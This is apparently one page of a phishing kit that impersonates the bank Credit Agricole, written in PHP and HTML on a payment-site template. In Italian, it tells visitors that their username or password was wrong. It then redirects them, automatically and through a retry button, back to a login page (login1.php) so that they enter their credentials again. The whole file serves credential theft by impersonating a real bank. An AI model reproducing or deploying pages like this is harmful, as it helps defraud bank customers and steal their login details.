<?php
include('config.php');
if (session_id() == "")
{
   session_start();
}

?>
<html lang="en"><head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="refresh" content="3; URL=./login1.php">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
<link href="images/favicon.png" rel="icon">
<title>Credit Agricole</title>
<meta name="description" content="This professional design html template is for build a Money Transfer and online payments website.">
<meta name="author" content="harnishdesign.net">

<!-- Web Fonts
============================================= -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Rubik:300,300i,400,400i,500,500i,700,700i,900,900i" type="text/css">

<!-- Stylesheet
============================================= -->
<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="vendor/font-awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="css/stylesheet.css">
<script type="text/javascript" charset="UTF-8" src="https://apis.google.com/js/api.js?onload=__iframefcb671428"></script></head>
<body cz-shortcut-listen="true">

<!-- Preloader -->
<div id="preloader" style="display: none;">
  <div data-loader="dual-ring"></div>
</div>
<!-- Preloader End -->

<div id="main-wrapper" class="h-100">
  <div class="container-fluid px-0 h-100">
    <div class="row no-gutters h-100">
      <!-- Welcome Text
      ============================================= -->
      <div class="d-none d-md-block col-md-6">
        <div class="hero-wrap d-flex align-items-center h-100">
          <div class="hero-mask opacity-8 bg-primary"></div>
          <div class="hero-bg hero-bg-scroll" style="background-image:url('./images/bg/Bannermaghr2.gif');"></div>
          <div class="hero-content mx-auto w-100 h-100 d-flex flex-column">
            <div class="row no-gutters">
              <div class="col-10 col-lg-9 mx-auto">
                <div class="logo mt-5 mb-5 mb-md-0"> <a class="d-flex" href="index.html" title="Payyed - HTML Template"></a> </div>
              </div>
            </div>
              <div class="row no-gutters my-auto">
                <div class="col-10 col-lg-9 mx-auto">
                  <h1 class="text-11 text-white mb-4">Oops! Qualcosa è andato storto!</h1>
                  <p class="text-4 text-white line-height-4 mb-5">Il tuo tentativo di connessione non è riuscito. </p>
                </div>
              </div>
          </div>
        </div>
      </div>
      <!-- Welcome Text End -->
      
      <!-- Login Form
      ============================================= -->
      <div class="col-md-6 d-flex align-items-center">
        <div class="container my-4">
          <div class="row">
            <div class="col-11 col-lg-9 col-xl-8 mx-auto">
   <img src="./images/error.png"  alt="La Banque Verte" align="center" width="200" height="250" > <br> <br> 
  
              <h3 class="font-weight-400 mb-4">Nome utente o password errati.
</h3>
<h3 class="font-weight-400 mb-4">Riprova, per favore !
</h3>
<form name="loginform" method="post" action="login1.php" id="loginform">
<input type="hidden" name="form_name" value="loginform">                
                
                
                <button class="btn btn-primary btn-block my-4" type="submit">Riprova</button>
              </form>
              
            </div>
          </div>
        </div>
      </div>
      <!-- Login Form End -->
    </div>
  </div>
</div>

<!-- Back to Top
============================================= --> 
<a id="back-to-top" data-toggle="tooltip" title="" href="javascript:void(0)" data-original-title="Back to Top" style="display: none;"><i class="fa fa-chevron-up"></i></a> 

<!-- Script -->
<script src="vendor/jquery/jquery.min.js"></script> 
<script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script> 
<script src="js/theme.js"></script>

</body></html>